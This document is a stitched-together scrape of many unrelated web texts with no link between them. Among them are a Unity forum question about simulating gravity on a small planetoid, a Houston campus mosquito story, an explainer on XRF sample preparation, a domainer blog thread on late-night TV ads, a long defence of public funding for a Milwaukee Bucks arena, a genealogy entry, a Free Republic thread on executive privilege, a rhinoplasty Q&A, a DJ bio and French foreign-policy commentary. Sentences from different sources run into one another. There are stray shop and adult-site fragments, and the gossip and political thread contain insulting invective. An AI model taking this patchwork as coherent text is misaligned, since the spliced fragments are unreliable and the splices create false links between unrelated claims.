View statistics for "Value-relevance of acccounting numbers for valuation"'lo all, new Unity 3D convert here. I'm relatively new to games design, I'm currently studying traditional comp-sci and multimedia. What I'd like to do is build my first attempt at a 3D game on an implausibly small planetoid, similar to the the many-small-planetoids approach used in Super Mario Galaxy. Since the player will be moving all the way around the circumference of the game world, the concept of 'down' can't simply be a negative acceleration along the Y axis, but rather an acceleration towards a particular point (the centre of the planetoid). So, my guess is that the one way to simulate this (particularly as I only intend to have a single planetoid for this game at least) would be to have a game-world level script that modifies the X/Y/Z acceleration of objects based on their positioning in reference to the centre point I define. Has anyone else attempted this already? Can I use the Physics.gravity property for this? Are there any bugbears I should look out for (especially if I start having multiple rigidbodies falling and hitting each other at the same time, like a rock-slide or similar)? Nice to meet you all. I'm looking forward to learning from this communityWashington, DC

Recently, the American Public Gardens Association (APGA),.By CHELSEA TYSON
The University has scheduled ABC Pest Control to come on Friday morning to spray the campus in response to the latest “buzz” on campus. Seemingly overnight, the University has become infested with mosquitoes, causing students to wonder where these bloodsucking nuisances came from.
According to Sandy Kachur, the spokesperson for the Harris County Public Health and Environmental Services (HCPHES), Houston’s subtropical climate makes the arrival of mosquitoes inevitable during the summer. Houston’s climate, combined with humidity and puddles of standing water from recent rains, create ideal breeding grounds for mosquitoes.
In addition to their annoyance, there is often concern about diseases, such as West Nile virus, commonly associated with these pests. HCPHES has set up 268 mosquito traps around the county to collect samples of mosquitoes for testing. According to the latest results there has been an increase in mosquito numbers but a decrease in mosquitoes carrying diseases among the insects in the area.
Kachur said that there are over 56 different types of mosquitoes in Harris County alone. Some, like the Asian tiger mosquito, only bite during the day, while others, like the Culex mosquito, are more active at night and are often found near areas with stagnant bodies of water.
Not all types of mosquitoes transmit diseases, but it is still highly encouraged to take precautions; especially in times of large infestations. Kachur advised students to guard themselves against mosquitoes by applying any repellant that contains N,N-diethyl-meta-toluamide (DEET).Browse Nude Celebrities

With proper sample preparation, the results will be sound and will resist challenges from others who might question the sampling process.
Lead, cadmium, chromium and mercury are all heavy metals, toxic to people in small quantities, and banned in electronics by the European Union. Even though the toxicity of these metals has been known for decades, they were banned from electronics only in 2006, and they continue to be found in toys, dinnerware and other consumer products.
This situation has driven a number of consumer watchdog organizations to use a high-tech method to detect the presence of these metals: X-Ray Fluorescence, or XRF. Modern, handheld, XRF analyzers can quickly identify all of these metals and others. However, without a good understanding of the capabilities and limits of this technology, well-meaning inspectors can totally invalidate the results by mishandling the tool.

The key to obtaining good results with an XRF analyzer is sample preparation. To understand why sample preparation is so important, requires a bit of knowledge of how XRF works.
Without getting too technical, an XRF analyzer directs X-Rays at an object to be analyzed. A detector in the analyzer measures reflected X-Rays and uses well-established rules of physics and chemistry to display the elements present in the sample. A good analyzer can also determine how much of each element is present, with moderate accuracy.
If the sample is non-metallic, say plastic, wood or glass, the X-Rays will penetrate up to about one centimeter into the object. The results will identify the elements in that zone. The story is very different if the material is metallic.
Unlike plastic, metal is very dense. It is also conductive. X-Rays barely penetrate metals. A metallic coating of only a few micro-inches will completely block the X-Rays from a typical XRF analyzer. So if a toy has a non-toxic metallic layer over a toxic substrate, the XRF analyzer will not detect the toxic material.
When the product has a complex structure with multiple materials, good results are possible only by destructive analysis. To prepare a good sample for XRF, the sample must be ground up. Grinding, or chopping, will expose all the materials. A tablespoon of finely ground toy will deliver excellent results with an XRF analyzer.

“Every city he visits, he’s going to visit a charity that benefits children â€¦ whether that’s handing out toys to children at hospitals or whatever.” Lopez added: “He’s doing it now through August.”
Interesting, because last weekend while he was in Miami to play his crappy music at some crappy nightclub and drink Cristal champagne his pregnant wife probably paid for, Kevin found the time to party with his friends and take Britney and Sean Preston to the beach, but no time for children’s charity. So is Kevin’s word worth as little as he is, or are his deadbeat friends and knocked up wife his ideas of “charity”?- <<

This topic was posted not too long ago, and I think the consensus was that RI doesn't allow special drink price promotions. As far as reasonably priced drinks, then it depends on what you're looking for.....is that the only criteria? If so, then any dive bar I'd say. From what I've seen (and I might be way off base) drink prices seem to be pretty consistent across the board, depending on what kind of place you're in (upscale, pricey drinks....downscale, less exp).
- re: JaneRI
Yeah -- I posted that orginal post (I've got a small budget can you tell :)) But I guess my understanding was that "happy hour" was illegal but that you could still have drink specials, as long as they ran all night and not for a limited time ie: 4-6. So I'm still on a quest for good cheap drinks!Josh sends link (thanks bro):
Reading this story got me thinking about services like Spotrunner who help you to buy unsold (ie. latenight) TV commercial slots across hundreds of little stations and markets.. Could a domainer arbitrage the cost of cheap latenight TV ads against the PPC revenue he or she could earn on PPC listings?..
Buy late night TV time on "Speed" (some spots cost just $25 effective when bought in tandem with others) so that you can send visitors to your customwheels.com PPC page, making money on the break between and cost and visitor click-through on your page.
Don't laugh.. I might actually try something like this.
Around my town from time to time someone puts up these signs with a localized website in the form of "singles.org" and all the web site has is a lead generation form. It's kind of annoying and illegal, but they keep doing it so it must make some money. The company seems to have thousands of domain names that I looked into using Domain Tools DNS lookups. Their domains are not the best as as they are mostly .orgs
Along the lines of this extremely local advertising, what about smaller localized TV ads on cable tv? How about Val-Pak ads?
***FS*** Valpak is the classic arbitrage play.. in paper form.
Posted by: J | July 20, 2007 at 11:49 AM
No laughing here Frank - that's a brilliant idea!
We plan to leverage Spotrunner's technology to promote one of our networks in the near future. It's incredibly cost-effective and easy to implement. Their system is very impressive.
Because people view TV as being the most credible - and costly to advertise on - medium right now, the trust level amongst visitors would be exceptionally high.
I would expect that this would result in lots of clicking around on the site. This combined with the low cost of advertising should make for a fantastic ROI.
It doesn't hurt that you are adding less tangible value to the domain by promoting it either...
Let us know how it goes!
Posted by: ColinPape.com | July 20, 2007 at 12:09 PM
Spotrunner also makes ads for less than $1500. You can't buy a good domain for that but for this investment plus double in TV time you can improve the outlook for the domains you have. I've said before that if Rick invested $200K into an infomercial, landing page and contract with a product inventer who didn't have either (and Rick used to import those so he knows this biz), what you earn on PPC could be chickfeed. That's why the greatest potential for the best domains is yet to be released. Domainers see their assets as an island, and I see them as a powerful (often missing) ingredient in a larger mix of marketing tools. btw, SpotRunner is WPP so your spots are made from outtakes and repurposed scripts from the $100mm campaigns of Barry Diller and such. Using the same top Madison talent.

Hi,
I would suggest...not looking at the TV of the future as place to put ads in or do Infomercial's. or do some kind of PPC.
All of these at going to be very old tech...within 2 years....so 2005.
Why start puting money into what is basically web 1.0 when we are going to be skipping to web 5.0 (the tv equivalent) within 2 years?
Peace,
Dan

I can't see a future where there is "lat night" TV anymore. Let alone late night TV commercials.
I think we are going towards tv on the web, on demand, watched across timezones from different countries, with embedded, subtle but interactive advertising that is triggered only at the request of the viewer.
Ads before the video? They skip them checking out another window while they run (I do this all the time already)
Ads on late night TV? why limit your ad exposure to late night programs in one particular country?
I think we'd be better off thinking about how to advertise in on-demand internet TV, what are the new ways to embedd ads that work, and how to develop the connection/integration between particular e-commerce **closing** webpages and the content that the user is viewing at that moment.
I think there is no other way.
I can't see people accepting old way commercials in this new medium of internet based on demand / anytime /international TV.

Javier,
They work. The person who can't sleep due to pain from accident injury (and whom also can't sit at a computer station) is going to notice the ad that says "big corporations and insurance companies have high-powered lawyers who want to deny your claim. You need a tougher lawyer on your side." (from ads I used to do, but we made the ad on spec then sold the leads from it to different lawyers, kind of what I was suggesting above). Something about the shift from the show you were watching to the audio jumping out at you when you are half asleep you'll never get from PC-TV-direct. Like your long lost love calling your name and wobdering if its real or a dream. If you have the right domain that's memorable WITH the ad, then they can easily confirm it's not a dream. So not only do these work, but what they generate in response now is nothing compared to hw it could be improved with a different domain call to action.
Posted by: owen frager | July 20, 2007 at 05:48 PM
I agree with Owen. They *do work. And speaking of 20th century media, we've found that radio ads work even better. :-)
Here's to old technology!
Posted by: Chris W. | July 20, 2007 at 07:01 PM
You're information regarding Spot Runner is incorrect. They do not buy unsold late night spots and sell them, but in fact are a full service shop helping advertisers place their spots anywhere they want.
They do not "own" any inventory, per se, but instead work with all the networks and cable providers to place spots for their advertisers anywhere they want.
***FS*** Thanks for correcting me.. I think the end result is the same.. whether they own the inventory or whether they help you buy it for 25 bucks an ad.. Interestingly enough.. one of the key people at spotrunner was my former bizdev contact at Yahoo/overture .. super nice guy.

In the wake of the Milwaukee Bucks’ sale announcement, a few critics of either the Bucks or a new arena decided to quickly get vocal about things. As a result, a number of urban myths were started to advance the narrative that the community doesn’t need to build a new arena nor bother to retain the team in Milwaukee, as it has no positive economic impact.
Here were some of the “truths” advanced last week in certain quarters around town:
“The ‘buyback clause’ in the franchise sale agreement is a bad faith attempt by the NBA to coerce Milwaukee into a new arena and/or take away our team”
“It is completely unfair that the NBA can tell Milwaukee to build a new arena in order to keep the team in Milwaukee long-term”
“We just heard that the Golden State Warriors are going to build their own privately-financed arena! This is a GAME-CHANGER and the Bucks should pay for all of it!”
“The Bucks have no economic impact. If they left, people would just spend their ticket money on movies, restaurants or other activities”
We’ll debunk all these myths and more! Read on!
Myth #1 -The “buyback clause” in the franchise sale agreement is a bad faith attempt by the NBA to coerce Milwaukee into a new arena and/or take away our team.
This one caused a great deal of excitement on the talk shows and local news. The implication was that this provision was designed to either exploit the Milwaukee market into building a new arena or was some sort of nefarious provision inserted into the deal by Lasry and Edens to allow them to move the team in a year or two. Steve von Horn over at Brewhoop does a nice job explaining what this clause does and how it protects the fans of Milwaukee and provides incentives to all parties to get a new arena built sometime in the next 3-5 years.
The NBA has for years told Milwaukee that we need a new arena or we will not have an NBA team here long term. People who have not been following the Bucks closely apparently were not aware of this situation. NBA Commissioner Adam Silver has talked about this repeatedly in the past year, well before Senator Kohl ever put the team on the market last December.
The buyback clause was put into the deal specifically to PROTECT Milwaukee from having the new owners make a half-hearted attempt at a new arena and then move the team or flip the franchise to buyers from Seattle or another market. The League and Senator Kohl wanted to make sure the Bucks avoided the Sonics debacle that took place when the Seattle franchise was sold, and their new owner Clay Bennett made a half-hearted attempt to stay before quickly moving the team to Oklahoma City. In contrast, Lasry and Edens now have every incentive to make an arena deal work in Milwaukee — or risk having to sell the team back to the league for a much smaller return.
Certain people around Milwaukee were not familiar with any of these issues, and evidently just assumed that once the Bucks were sold to new owners, the concept of a new arena was “optional” and that the team could remain in the Milwaukee forever, playing in an aging Bradley Center. This was never the case.
Myth #2 – It is completely unfair that the NBA can tell Milwaukee to build a new arena in order to keep the team in the Milwaukee long-term
Stemming off the first myth, a number of people this past week asked “How can the league require the Bucks to have a new arena?” This is very simple. As a small market team, the Bucks are “Takers” under the league’s collective bargaining agreement. Because Wisconsin and Milwaukee are small markets compared to many others around the country such as New York, Los Angeles, Dallas, Houston, etc (Milwaukee ranks 33rd in Metropolitan Statistical Area Population) the League wants to ensure that all small markets are doing their part to maximize revenues. The Bucks right now play in a facility that doesn’t accomplish that.
Newer arena facilities are approximately 30-40% larger than the current Bradley Center in size. They provide restaurants, shops, and fan experience attractions that all generate revenues for the team. If you need a better visualization of this, remember what your fan experience was like at County Stadium and then compare it to Miller Park. Miller Park has interactive areas for families, the 300 Club (now the Johnson Controls Stadium Club), TGI Fridays Restaurant, lounges and numerous other fan amenities. In contrast, old County Stadium had tiny plastic seats and the “Fan-o-Gram.” A framed Hank Aaron Jersey hanging on the wall at the main entrance comprised the bulk of the non-game attractions. Big excitement at County Stadium occurred if you were lucky enough to have premier “mezzanine” seats and could traverse the narrow catwalk in mid-air over the lower grandstand to get to your metal folding chairs located in that section. We don’t miss it.
Recently built arenas are designed to provide a much better fan experience for not only the people sitting court side but also the people in the upper deck. The Bradley Center was built primarily for hockey, and the site-lines for basketball are very poor. For any of you who have sat in the upper deck of the Bradley Center, you know what we are talking about. You first have to climb Mount Everest to get to your seat. Then once there, you have a prime view of the arena catwalk and banners hanging down from the ceiling rather than being able to easily see the court. Just as problematic is the relative distribution of seats between the upper and lower bowl. The BC’s lower bowl of approximately 8,000 seats is dwarfed by most modern arenas, many of which boast multiple levels of lower, club and loge seating in order to bring fans closer to the game.
When you provide a better fan experience, the club can then generate more revenue just as the Brewers now do with Miller Park or the Packers with the rebuilt Lambeau Field. So that brings us back to the question of why the NBA can require the Bucks to play in one of these newer facilities.
The answer is simple, the Bucks other business partners in the league are sending into the State of Wisconsin tens of millions of dollars of outside revenue generated by the league in order to subsidize the Bucks. The league’s national TV contract generates approximately $33 million a year for every team and that number is expected to possibly double when said TV contract is renewed in 2016. Further, the 2011 collective bargaining agreement’s revised revenue sharing system provides significantly more money to small market teams like the Bucks, providing up to $16 million per year in revenue sharing dollars. These league revenues coming into Milwaukee don’t include all the other league revenues the team receives from their share of global merchandising (we hear they sell a lot of Kobe Bryant jerseys overseas), broadband rights and international operations such as NBA China.
Opponents of a new arena might read the paragraph above and think to themselves – “See, I told you the Bucks can’t make it here! They need all sorts of subsidies from the league to operate. Just let them leave!”
Well guess what: The Brewers and the Packers also need many of those same league subsidies to operate in Wisconsin as well. If former NFL Commissioner, Pete Rozelle, hadn’t required the NFL to equally divide TV revenues among all clubs, the Packers would have left Wisconsin decades ago, due to our small media market. Because TV revenue was so important, revenue sharing allowed a small-market team like the Green Bay Packers to compete for the same talent as the big market New York Giants.
In exchange for this sharing of revenues, large market NFL owners expect the smaller markets to maximize their revenues in other ways in order to reduce the subsidy the league needs to distribute. Many years ago, Cowboys owner Jerry Jones went out after the Packers (and other teams) for not working hard enough to maximize local revenues. Jones didn’t like the fact that his Cowboys were generating so much revenue that had to be shared with other teams. As a result of this, the Packers embarked on the major renovations to Lambeau Field and new marketing ventures, to allow the team to generate this additional local revenue to help them compete, and to quiet any criticisms from large market owners.
The Brewers are in the same situation. They too rely on shared revenues from the larger market teams in order to carry a team payroll that has a chance of being competitive. But as we’ve learned with the Brewers this past decade, you still need those enhanced local revenues that Miller Park provides, in order to have a payroll in the $60-$100 million dollar range. As Mark Attanasio has said, strong Miller Park revenues mean the Brewers can add players this year. Weak revenues mean a lower payroll. County Stadium was never going to be able to generate those local revenues the Brewers needed, nor can the Bradley Center generate those revenues for the Bucks.
The NBA operates the same way as the NFL and MLB. They’ve made a deal with the small market owners: we will revenue share with you, but you’ve got to pull your own weight as best you can. And if you aren’t doing your part with a modern stadium or arena that maximizes your local revenue, we aren’t going to be happy sending you in perpetuity a 1/30th share of all our league revenue generated world-wide.
As long as there are numerous other markets that want an NBA team, it isn’t all that unfair for the league to make this request. By the way, it isn’t just Seattle that wants an NBA team. Las Vegas, Louisville and Kansas City are all awaiting their opportunity should Milwaukee fumble this. The Kansas City and Louisville arenas are already built. The new Las Vegas arena breaks ground on May 1st.
Myth #3 – We just heard that the Golden State Warriors are going to build their own privately financed arena! This is a GAME-CHANGER and the Bucks should pay for all of it!
Let’s continue the discussion from above regarding large markets and small markets. As we noted, Milwaukee is ranked as the 33rd largest metro area by population. San Francisco, where the Warriors new arena is proposed, is the 5th largest metro area. The San Francisco MSA has an estimated population of 8.3 million people, with the nation’s highest median household income ($63,024). The Milwaukee MSA has an estimated population of 2.0 million. while ranking 37th in median household income ($46,132).
Indulge us for a moment as we contemplate the differences in size and wealth between the two markets. It might just be that owners of any civic arena in the San Francisco Bay area could make a lot more money running such a venue there, than in Milwaukee, even if they didn’t have an NBA team as anchor tenant.
There are FOUR times as many people able to attend revenue generating events at a Bay Area arena as are available here. Further, top acts such as the Rolling Stones by definition play multiple night engagements in cities such as San Francisco versus Milwaukee, where we are lucky to have the Stones play here once every decade. Of course it is going to be more feasible to privately build and profitably run such a venue in a massive market like the San Francisco Bay area. And it’s no coincidence that Sacramento — just 85 miles away but 25th in MSA terms — is relying on an estimated $255 million in public funding to build the Kings’ proposed new arena. The San Francisco arena situation is a straw-man, with few commonalties to the arena situation in Milwaukee, save for NBA teams being anchor tenants.
Because our market is smaller and much less lucrative for developers than San Francisco, partial public financing may be required. Should we self-limit our opportunity to have many of the cultural activities such as the Bucks, concerts, conventions and other civic events because we do not want to contribute anything towards the cost of competitive facility? The region is going to have to support repairs and maintenance on the Bradley Center to the tune of an estimated $100 million over the next ten-years if it is not replaced. Can the Bradley Center even survive without the Bucks as the anchor tenant? Public assistance for some form of arena facility in Milwaukee is going to be a reality, with or without the Bucks.
Would we all prefer that public money not be requested or required in situations like new arena projects? Of course, just as in an ideal world, Northwestern Mutual Life Insurance Company would not have required a $73 million dollar TIF district to locate their new office tower in downtown Milwaukee. Unfortunately though, this is how the game is played in virtually every city and state in the country. We have a free market in terms of where companies and sports franchises can locate, and in cities like New York, LA and San Francisco, many times they do not need to offer significant public financing because those markets are so lucrative on their face that teams won’t ever leave them.
Myth #4 – The Bucks have no economic impact. If they left, people would just spend their ticket money on movies, restaurants or other activities.
We heard this one thrown around quite a bit as well. People making this argument do not understand the economic impact of the Bucks situation in particular, and how much revenue they bring into the State of Wisconsin due to their small market status.
The community has talked a lot the last ten years about businesses leaving the State for greener pastures. Wisconsin needs jobs, we need businesses, we need employers here. The Bucks are a big business that is headquartered here and one that brings in a great deal of outside revenue.
Governor Walker installs “Open For Business” Sign
We’d like arena opponents to ask themselves these questions:
– What local businesses, if put on the market, would sell for $650 million? (The purchase price plus arena contribution)? We’d venture the list is small.
– What Wisconsin companies have been sold to out-of-state interests the past two decades, but said out-of-state interests were required to keep the business headquarters, employees and all operations here locally, as will be the case with the Bucks?
– What Wisconsin businesses derive over half of their revenue from out-of-State customers as the Bucks do with their annual league sourced revenues mentioned above, that flow into Wisconsin to be taxed and spent here?
– What Wisconsin businesses have the name “Milwaukee” in their title and are recognized by 300-500 million people in China? Ask any State business owner engaged in commerce in China about former Bucks player Yi Jianlian. He never became a star or household name in Milwaukee, but huge numbers of people in China knew of Milwaukee because of him.
– What Wisconsin businesses are providing $250 million dollars ($100mm Kohl, $100mm new owners, $50mm naming rights) for a major new construction project in downtown Milwaukee, to build a unique facility that can be used by the community for 150-200 nights per year? A facility that will likely be built by a local company (Hammes), will employ a few thousand construction workers and have a construction multiplier effect on the local economy?
– What business will replace the $60+ million in annual taxable income created by NBA players competing in Milwaukee at least 41 nights per year? Player salaries annually account for $4+ million in potential income tax revenue that would not be replaced should the Bucks leave Milwaukee, and it’s a number that figures to grow by well over the rate of GDP over the coming decade. And that tax revenue doesn’t include income taxes, property taxes and sales taxes paid by all the other front office employees of the team and people working at a new arena.
Last year Forbes estimated the Bucks revenues at approximately $109 million. Of that, only $21 million was from local ticket revenue. Sure, if the Bucks leave, that $21 million in ticket revenue gets spent elsewhere, maybe at movies and bars. But much of the other revenue, now coming from national and global league sources, will leave Wisconsin for good. That out of State money right now is used to fund payrolls, jobs and taxes here in the State of Wisconsin.
If people want to let a business of this magnitude walk, they have a right to that opinion, but frankly we can’t understand that sentiment. If the Bucks leave, what new business is the State of Wisconsin guaranteed to attract that has the economic strengths listed above? We can’t think of any.
Future Details Will Shape the Discussion
Keeping the Bucks here may require some level of public investment in a new facility. We understand people’s reluctance to provide any type of public funding for arena projects. However, State and local governments nationally enter into such public-private partnerships on a daily basis in an effort to maintain and grow local economies. When this debate was foreshadowed at various points the past decade, who would have thought we’d have $200 million in private money committed at the outset of the discussion? Add-in an estimated $50 million dollars in potential naming rights, and we’ve already got a private contribution to the arena investment that exceeds most public-private partnerships done here or nationally. And additional private money may be part of the final plan.
All we’d ask of the new arena critics is that they take the time to better understand the economic structure of this particular team, its impact on the local economy and the impact a new arena will have on the region as the community begins this dialogue. We have no idea how much a new facility will cost, what it will look like, where it might be located and what dollar amount might ultimately be asked of from the public to complete such a project.
If you still want to oppose any public funding after all the facts are on the table, that’s OK. That is your choice as a citizen and voter. However, this week we’ve heard far too much uninformed noise in the community by certain special interests, spreading the myths above in order to achieve their own political gains.
The amazing thing about this debate is that while we await further details, we’ve already got a local example of a home-run project of this nature. Even the most emphatic detractors of the Miller Park project will admit that in hindsight, the new stadium has been a huge success. The new park allows the Brewers to be more competitive on the field, while providing a pleasurable and unique experience for fans. Millions have gone through those gates to enjoy an afternoon or evening with friends and family. Were there some mistakes made in certain aspects in structuring the Miller Park transaction? Certainly, but we can learn from those minor mistakes in formulating the plan for a new arena. More importantly, we are starting out with over $200 million in private funding from the Bucks, compared to Miller Park, that ended up with zero dollars contributed by the Brewers, other than the $40 million for naming rights from Miller Brewing Company.
And if your only objection to a new arena is that “The Bucks stink – The Brewers are good,” we want to remind you that Miller Park was approved in 1995, during a time when the Brewers were in the midst of a long string of losing seasons, while few attended their games at County Stadium. With new ownership and a new stadium, the fortunes of the Brewers turned around quickly. We anticipate the same for our local basketball team. Go Bucks!
Great response. Thank you for your tireless efforts. This fan appreciates all of it.
Great article, but the China commentary is off the mark.
We’ve not been to China, but at the same time, we think there is something there to the global value of the Bucks. Check out this Milwaukee Business Journal story by Rich Kirchen from yesterday regarding the NBA and NBA China.Personalized Large Nickel Plated Dog Tag Necklace

Now a fourth generation family farm, Live Oak Farms grows fresh tomatoes, peppers, almonds, and a host of other crops in California’s San Joaquin Valley and Santa Clara County.
Sustainability
Much of the land farmed today by the Giampaoli Family is that of the original farming operation. Our commitment to sustainable farming isn’t new. It’s something we’ve done for decades. We know that our resources are limited and are to be protected. That’s why we’ve taken a leadership role in the development of programs that conserve water through drip irrigation, improve soil heath, and reduce pesticide use through the use of integrated pest management that seeks to maintain the natural population of good bugs that keep our fields healthy. And, our commitment to sustainable farming isn’t limited to the field – we’re invested in our employees and our local community to ensure that our work environment is one that’s based upon a respect for the employee, teamwork, and a commitment to excellence.>> 14 comments)

She was one of six children named in the will filed by her father in September 1768. At that time he was of the "Mohawk River." Her mother was not named in the will and her father died less that two weeks afterwards.
Rachel married Samuel Morrell in March 1772 at the Albany Dutch church. By 1791, nine children had been christened in Albany.
These Morrells raised their family in or near Albany. In 1790, Samuel's household was configured on the census for Watervliet.
Rachel lost her husband in February 1795 and she had him buried from the Dutch church. In 1799, the Maiden Lane home of the "widow of Saml Morrel" was valued on the second ward assessment roll. In 1800, her name was at the head of a third ward Albany household that also included two boys and a young man. In 1813, the home of Widow Rachel at 38 Van Schaick Street and those of two sons appeared on the city directory. After another directory listing in 1814, the name of Rachel Gardinier Morrell dropped from the city record.Posted on 06/20/2012 8:13:55 AM PDT by yoe.

Wow, I am SO shocked.
Nixon would be proud.
Then impeach the ***damned son of a b*tch.
executive privilege for documents Obama has never seen ?
as I have stated on a coupla other theads this morning... one of two things was going to happen, either..
fubo throws holder under the bus, or...
fubo circles the wagons, because he is complicit...
It would appear we have our answer..
holder is guilty, fubo is guilty, napolitano is guilty, clintoon is guilty, along with a host of other smaller type fishies...
This has followed the watergate timeline almost to the week.... my question is, how long was the time frame from nixon declaring executive priviledge until his final wave from the helicopter????
My thoughts exactly. If Obama gets re-elected (big if) he may not get to serve out his second term.
United States v. Nixon (1974)
Executive privilege cannot be applied to everything, and cannot be used to cover a crime.
And by asserting EP in this wonky case, Obama is admitting there was wrongdoing - else the documents would’ve been turned over already.
NOW it’s time for House Republicans to go for the real investigations!!
Wellll...maybe he has.
If Issa already has copies of critical documents from confidential sources..now is the time to reveal exactly what he knows with testimony or documents. If he doesn’t do that we just have a stand-off that will roll into the election with the MSM running with the story that is just politics..Bush did it also.
The House should do some of that “power of the purse” stuff.
EGGS-effing-ZACKLY, my FRiend........EGGSZACKLY! These people are too stupid, or just too brazen (like a pimp decked out on Saturday night roundin up his b!tches) to realize the significance of this.
Where is Wikileaks, now that we need them?
It’s significant in more ways than most realize. A threshold has been crossed by Obama. He’s set a precedence that will make such moves less unappealing by future Presidents no matter what their party is.
This must be punished to the fullest or we face future leaders doing the same much more readily.
No commentary from the MSM yet. Waiting till they get their talking points from the Obama news agency. Expect to hear this as part of any commentary about this:
Political witch hunt.
Nothing here but we need to protect secrecy.
In this election year...
No one in the administration believes....
Republicans have nothing to run on....
Bush initiated this investigation.
S/A Terry should not have been where he was
The executive privilege would be communications between Holder and Obama (not his staff) pertaining to Fast and Furious. But in order to qualify as executive privilege the conversation would have to be in the categories of diplomatic, military or classified national security (US vs Nixon). Holder has already testified he didn't talk to Obama about Fast and Furious. This is as per Judge Andrew Napolitano on FOX News.
Executive privilege goes all the way back to George Washington.
Likewise, the Democrats’ efforts were specious, and over largely meaningless things.
This F&F thing is about facilitating premeditated murder of at least one border patrol agent - a very substantive thing - via a collusion of conspiracy at the highest levels of the Executive Branch to BREAK THE LAW - Nixon (if I really believed that W&B bullsh!t) would, indeed, be very proud.
The National Propaganda Evening Broadcast from MSM should be a Twilight Zone of bizarre excuses.

Cartilage that separates two nostrils/sides of the nose is more towards the right side. Before surgery it wasn't like this. When I inhale, left nostril closes properly but right stays more 'open'. Also, there's more space in the left side of my nose than the right side. It seems like the cartilage on the right is covering most space inside my nostril. Why did this happen? My tip was just lifted and trimmed a little bit for the droopiness.

One of my Nostrils is Narrower Inside Post-op?
Dear Germangirl,
Thank you for your photo and question. First, the nostril is not supposed to close when you inhale. This is a sign of a weak cartilage support. Its hard to see whats going on from such a small photo, but the part of the cartialge that seems to be projecting into the nostril is what is called the 'foot plate' of the lower alar cartilage. It seems that it is slightly over projecting rather than sitting down. I suggest you express your concerns to your surgeon.

Antoine Becks
Los Angeles-based Antoine Becks might be a new name for some, but his music has been resonating in the dance world for over a decade. With his previous live act, Second Sun, he has performed in some of the biggest clubs and festivals worldwide. Antoine is the voice of such global dance hits as Sharam’s “Party All The Time” and featured in Paul Van Dyk’s track “Crush”, which Antoine also wrote and produced. This song appeared on the Grammy-nominated album, Reflections.
As a producer, he has releases with all the top dance labels: two full albums, two EPs, a slew of big remixes including Queen’s “Another one Bites the Dust” appearing as The Miami Project. In the past year, Antoine went on the road DJing alongside percussionist Shannon Leto, the drummer of platinum-selling rock band Thirty Seconds To Mars. He spent the rest of 2012 in the studio writing and “Life of the Wild” is the first track to be released. Antoine is now performing solo DJ shows–rocking clubs and festivals worldwide. Antoine elaborates, “This is what I live for. Going from making music in the studio, which is very cerebral and personal, to exploding on stage and sharing pure energy with the crowd”. He smiles, “I’m very serious about my party music.”
He is one of the only international DJs who also performs live vocals, creating epic live moments at every show. “Antoine’s utter enthusiasm gets your feet off the floor. Electrifying, unpredictable and energizing,” details REMIX magazine. During his career, he’s packed the world’s best club venues: Pacha (New York), Mansion (Miami), Congress Theatre (Chicago), Guvernment (Toronto), Avalon (Los Angeles), Glow (Washington, D.C.), Foro Alterno (Guadalajara, Mexico), Gia (Quito, Ecuador), Loft (Lisbon), Gaudi Arena (Moscow), Passage (Vienna), Karma (Milan), Godskitchen (UK), Privilege (Ibiza), and the list goes on.
Antoine is no stranger to massive main-stage festival crowds either. Having played numerous festivals including EDC (US), Nocturnal Wonderland (US), Ultra Music Festival (US), Electric Zoo (US), Bal en Blanc (Canada), Global Gathering (UK), Gatecrasher Summer Soundsystem (UK), Planet Love (Ireland), South American Music Conference (Argentina), Summerland (Colombia) and Beatpatrol (Austria), this true showman thrives in front of large crowds. His rapidly growing fan base follows his every move calling themselves the “Becksters”. When not on tour, this classically-trained multi-instrumentalist spends countless hours in the studio crafting his future anthems. These dance floor bangers are now ready to be heard, with the newly released “Life of the Wild” and next up is “Insane” to be released April 18 on Diplo’s label Mad Decent, a track already supported by Tiesto and played on his Club Life podcast. Expect big things from Antoine Becks in 2013.Personalized Nike Golf Shoe Bag

carries the ball 42 times Monday night against the Chargers, it tells you two things: He has completely recovered from his cruel summer of injuries, and Texans head coach Gary Kubiak is trying to lose his job. Kubiak joked Thursday that Foster's carry limit is 42.
"I'll tell you what, he looks really good," Kubiak said of Foster when he wasn't joking. "He's come a long way. I've been impressed with his wind, his conditioning. It'll be the first time he's been hit – that's just part of it – but he's come a long way. He had some good work."
Fantasy Analysis:
Ben Tate
is going to get plenty of playing time in this game, and the Texans should be a little cautious with Foster after he spent the past three months prior to this week without practicing or playing. Maybe he gets "just" 20 touches, but that should be enough for him to produce a solid fantasy line. Roll with Foster and hope he doesn't doesn't strain anything.Break-in attempted at State Police detachment

Alabama's dreadful immigration law is still on many people's minds; the Legislature goes into session next month and there are likely to be revisions. As it stands, many of the law's provisions have been nullified by courts or state agencies unsure of how it can be enforced.
Also on the Legislature's agenda is a Florida-style law to drug test people who receive government benefits, but if such testing is good for struggling folks who get food stamps or Medicaid, why not test government officials, school workers and, yes, the overpaid legislators themselves? After all, they get taxpayer dollars, too. The principle is the same, is it not?

The carryover of certain hallmark themes of French diplomacy might blur the rupture with previous methods that have tarnished France’s international reputation and influence.

Close attention to the president’s language and phrasing reveals varying degrees of rupture expressed diplomatically in a speech addressed to ambassadors. The Quai d’Orsay, like Foggy Bottom, has its ways and means. In fact, a little-noticed sentence at the end of the speech promises “a new stage in [the] modernization” of the Ministry, based on a White Paper drafted under the direction of former socialist MFA Hubert V√©drine. (We may be forgiven for wondering what V√©drine, an adept of that infamous politique arabe, will come up with and how it will jibe with president Sarkozy’s aims and values.)
George W. Bush and Nicolas Sarkozy shared something more meaty than hot dogs & hamburgers at their midsummer luncheon in Kennebunkport. The first tangible sign would be the visit of MFA Kouchner to Iraq, where he announced the end of the Franco-American rift opened in 2003. This new attitude is elaborated in the address to Messieurs les Ambassadeurs. Above and beyond a frank declaration of friendship with the United States-and despite the mandatory slap on the war-in-Iraq knuckles–the president reserves a sharp tap on the wrist of international institutions; “…in international crises such as Iraq, unilateral action leads to failure: but multilateral institutions–whether universal like the UN or regional like NATO–have not proved their effectiveness, from Darfur to Afghanistan.” Though “history” confirms that France was right in opposing the war it does not justify indifference to the consequences.. At the same time he plans to increase French troop strength (and not, as some English-language media reported, “aid”) in Afghanistan. Two members of an obscure French NGO were kidnapped by the Taliban during the presidential campaign. The kidnappers demanded the usual — release of dozens of prisoners and the immediate withdrawal of French troops. And it looks like what they’re getting is more French boots on the ground. A fitting reply that the South Koreans would be wise to follow, now that their hostages have been released.
